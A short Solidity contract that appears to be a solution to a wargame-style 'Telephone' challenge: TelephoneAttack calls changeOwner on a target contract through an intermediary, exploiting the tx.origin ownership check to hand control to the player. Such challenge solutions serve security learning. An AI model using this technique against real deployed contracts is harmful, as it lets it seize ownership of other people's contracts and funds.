pragma solidity ^0.8.0;

import "../prob/Telephone.sol";

contract TelephoneAttack {
    function attack(address _target, address _player) public {
        Telephone telephone = Telephone(_target);

        telephone.changeOwner(_player);
    }
}
